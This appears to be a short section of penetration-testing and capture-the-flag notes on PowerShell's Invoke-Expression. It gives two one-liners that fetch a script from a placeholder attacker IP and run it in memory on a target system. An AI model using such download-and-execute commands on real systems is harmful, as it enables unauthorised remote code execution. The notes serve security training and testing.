# PowerShell
This new section is for all Microsoft Powershell-based techniques and syntax used during penetration testing and capture the flag.
## Invoke Expression
The `Invoke-Expression` cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without Invoke-Expression, a string submitted at the command line would be returned (echoed) unchanged.
```
PS C:\Target-System> IEX(New-Object Net.WebClient).downloadString('http://(ATTACKER IP ADDRESS)/(PowerShell Script).ps1')
```
OR
```
PS C:\Target-System> Invoke-Expression(New-Object Net.WebClient).downloadString('http://(ATTACKER IP ADDRESS)/(PowerShell Script).ps1')
```
